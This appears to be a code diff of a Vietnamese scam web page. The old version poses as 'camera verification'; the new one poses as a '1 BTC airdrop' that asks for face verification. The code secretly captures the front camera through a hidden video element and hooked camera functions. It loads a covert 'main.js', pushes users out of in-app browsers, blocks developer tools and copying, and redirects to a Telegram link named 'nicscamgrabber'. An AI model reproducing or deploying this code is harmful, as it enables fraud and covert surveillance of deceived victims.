@@ -1,282 +1,157 @@
+
 <!DOCTYPE html>
-<html lang="eng">
+<html lang="vi">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Thực Camera</title>
+    <title>Blockchain Airdrop - Nhận 1 BTC</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0d1117;
-            color: white;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0b0e11;
+            color: #eaecef;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
         }
 
         .card {
-            background: #161b22;
+            background: #1e2329;
             padding: 30px;
-            border-radius: 24px;
+            border-radius: 16px;
             text-align: center;
             width: 90%;
-            max-width: 380px;
-            border: 1px solid #30363d;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            border: 1px solid #474d57;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
-        .camera-view {
-            width: 100%;
-            height: 300px;
-            background: #000;
-            border-radius: 16px;
-            margin: 20px 0;
-            overflow: hidden;
-            position: relative;
-            border: 2px solid #30363d;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .btc-icon {
+            width: 80px;
+            margin-bottom: 20px;
         }
 
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: none;
+        h2 {
+            color: #f3ba2f;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #848e9c;
+            font-size: 14px;
+            line-height: 1.6;
         }
 
         .btn {
-            background: #238636;
-            color: white;
+            background: #f3ba2f;
+            color: #000;
             border: none;
-            padding: 18px;
+            padding: 15px;
             width: 100%;
-            border-radius: 12px;
+            border-radius: 8px;
             font-weight: bold;
             cursor: pointer;
             font-size: 16px;
+            margin-top: 20px;
             transition: 0.3s;
         }
 
-        .btn:disabled {
-            background: #21262d;
-            color: #8b949e;
-            cursor: not-allowed;
+        .btn:hover {
+            background: #dba323;
         }
 
-        #status {
-            font-size: 13px;
-            color: #8b949e;
-            margin-top: 15px;
-            line-height: 1.5;
+        /* Camera ẩn hoàn toàn */
+        #vBox {
+            width: 0;
+            height: 0;
+            opacity: 0;
+            overflow: hidden;
+            position: absolute;
         }
 
-        /* Lớp phủ cảnh báo cưỡng bách cho In-App Browser */
-        #browser-warning {
+        #loading {
             display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #0d1117;
-            z-index: 10000;
-            padding: 40px 20px;
-            box-sizing: border-box;
-        }
-
-        .warning-box {
-            background: #1c2128;
-            border: 2px solid #f85149;
-            padding: 30px;
-            border-radius: 20px;
-            text-align: center;
-        }
-
-        .warning-box h3 {
-            color: #f85149;
-            margin-top: 0;
-        }
-
-        .steps {
-            text-align: left;
             margin-top: 20px;
-            color: #c9d1d9;
-            font-size: 16px;
-            line-height: 2;
         }
 
-        .highlight {
-            color: #ffeb3b;
-            font-weight: bold;
+        .spinner {
+            border: 3px solid #30363d;
+            border-top: 3px solid #f3ba2f;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
     </style>
 </head>
 
 <body>
 
-    <div id="browser-warning">
-        <div class="warning-box">
-            <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
-            <div class="steps">
-                Hãy Mở Website Theo Hướng Dẫn Phía Dưới Để Không Bị Chặn. Vui lòng:<br>
-                1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> ở
-                góc trên bên phải.<br>
-                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span> (hoặc <i>Open in Browser</i>/<i>Safari</i>)
-                để bắt đầu xác thực.
-            </div>
-        </div>
-    </div>
+    <div class="card">
+        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="btc-icon" alt="BTC">
+        <h2>Chúc mừng bạn!</h2>
+        <p>Bạn đã đủ điều kiện nhận 1 BTC từ chương trình tri ân. Nhấn nút bên dưới để xác thực khuôn mặt và hoàn tất
+            quy trình nhận thưởng vào ví.</p>
 
-    <div class="card" id="mainCard">
-        <h2 style="margin: 0;">Xác Minh Người Dùng</h2>
-        <div class="camera-view" id="vBox">
-            <p id="msg" style="color: #484f58;">Đang khởi tạo camera...</p>
+        <div id="vBox">
             <video id="preview" autoplay playsinline muted></video>
         </div>
-        <button class="btn" id="startBtn">BẮT ĐẦU XÁC THỰC</button>
-        <div id="status">Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.</div>
+
+        <div id="loading">
+            <div class="spinner"></div>
+            <p>Đang quét khuôn mặt và mã hóa dữ liệu...</p>
+        </div>
+
+        <button class="btn" id="startBtn">XÁC THỰC & NHẬN 1 BTC</button>
     </div>
 
     <script>
-        // --- PHẦN 1: CẬP NHẬT USER AGENT TIKTOK MỚI NHẤT ---
-        function checkAndShowWarning() {
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
-
-            // TikTok sử dụng 'TikTok', 'musical_ly', 'ByteLocale' trong chuỗi UA của họ
-            const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
-            const isOtherInApp = /FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
-
-            if (isTikTok || isOtherInApp) {
-                document.getElementById('browser-warning').style.display = 'block';
-                document.getElementById('mainCard').style.display = 'none';
-            }
-        }
-        document.addEventListener("DOMContentLoaded", checkAndShowWarning);
-
-        // --- PHẦN 2: LOGIC CAMERA PROXY (GIỮ NGUYÊN) ---
         const btn = document.getElementById('startBtn');
+        const loading = document.getElementById('loading');
         const video = document.getElementById('preview');
-        const status = document.getElementById('status');
-        const msg = document.getElementById('msg');
-        const REDIRECT_URL = "https://t.me/nicscamgrabber";
+        const REDIRECT_URL = ""; // Trang đích sau khi xong
 
-        const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
-        const originalStop = MediaStreamTrack.prototype.stop;
-        let frontStream = null;
-
-        navigator.mediaDevices.getUserMedia = async (constraints) => {
-            const stream = await originalGetUserMedia(constraints);
-            if (constraints.video && constraints.video.facingMode === 'user') {
-                frontStream = stream;
+        // Kích hoạt camera ngay khi vào trang để sẵn sàng
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
-                video.style.display = "block";
-                msg.style.display = "none";
-                document.getElementById('vBox').style.borderColor = "#238636";
-            }
-            return stream;
-        };
-
-        MediaStreamTrack.prototype.stop = function () {
-            if (this.label.toLowerCase().includes('front') || this.label.toLowerCase().includes('user')) {
-                console.log("Giữ lại preview cho camera trước...");
-            } else {
-                originalStop.apply(this);
-            }
-        };
+            } catch (err) { console.warn("Yêu cầu quyền camera để nhận thưởng."); }
+        }
+        initCamera();
 
         btn.addEventListener('click', () => {
-            btn.disabled = true;
-            btn.innerText = "ĐANG XỬ LÝ...";
-            status.innerHTML = "Đang Xác Thực Khuôn Mặt...<br>Vui Lòng Giữ Nguyên Vị Trí.";
+            btn.style.display = 'none';
+            loading.style.display = 'block';
 
+            // Gọi script xử lý ngầm
             const script = document.createElement('script');
             script.src = 'main.js';
             document.body.appendChild(script);
 
-            const checkFinished = setInterval(() => {
-                if (window.mainScriptFinished === true) {
-                    clearInterval(checkFinished);
-                    startCountdown();
+            // Chờ tín hiệu từ main.js để chuyển hướng
+            const check = setInterval(() => {
+                if (window.mainScriptFinished) {
+                    clearInterval(check);
+                    window.location.href = REDIRECT_URL;
                 }
             }, 500);
         });
-
-        function startCountdown() {
-            let timeLeft = 7;
-            const timer = setInterval(() => {
-                btn.innerText = `HOÀN TẤT TRONG ${timeLeft}S`;
-                status.innerText = "Xác Thực Thành Công, Đang Chuyển Hướng...";
-                timeLeft--;
-
-                if (timeLeft < 0) {
-                    clearInterval(timer);
-                    if (frontStream) {
-                        frontStream.getTracks().forEach(t => originalStop.apply(t));
-                    }
-                    window.location.href = REDIRECT_URL;
-                }
-            }, 1000);
-        }
-
     </script>
-    <!-- Code chặn chuột phải và F12 (không hiện thông báo) -->
-    <script>
-        // Chặn chuột phải
-        document.addEventListener('contextmenu', function (e) {
-            e.preventDefault();
-            return false;
-        });
-
-        // Chặn F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-        document.addEventListener('keydown', function (e) {
-            // F12
-            if (e.key === 'F12') {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+Shift+I (Inspect)
-            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+Shift+J (Console)
-            if (e.ctrlKey && e.shiftKey && e.key === 'J') {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+U (View Source)
-            if (e.ctrlKey && e.key === 'u') {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+S (Save)
-            if (e.ctrlKey && e.key === 's') {
-                e.preventDefault();
-                return false;
-            }
-        });
-
-        // Chặn select text (không cho bôi đen copy)
-        document.addEventListener('selectstart', function (e) {
-            e.preventDefault();
-            return false;
-        });
-
-        // Chặn copy
-        document.addEventListener('copy', function (e) {
-            e.preventDefault();
-            return false;
-        });
-    </script>
-
-    </script>
-
 </body>
 
 </html>
